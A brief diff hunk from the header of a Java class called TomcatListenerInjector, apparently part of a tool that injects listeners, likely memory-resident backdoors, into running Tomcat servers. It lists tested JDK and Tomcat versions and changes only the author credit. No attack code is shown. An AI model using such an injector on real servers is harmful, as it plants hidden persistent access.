@@ -14,10 +14,10 @@ import java.util.zip.GZIPInputStream;
 
 /**
  * Tomcat Listener 注入器
- * Author: pen4uin
  * 测试版本：
  * jdk    v1.8.0_275
  * tomcat v5.5.36, v6.0.9, v7.0.32, v8.5.83, v9.0.67
+ * @author pen4uin, ReaJason
  */
 public class TomcatListenerInjector {
 
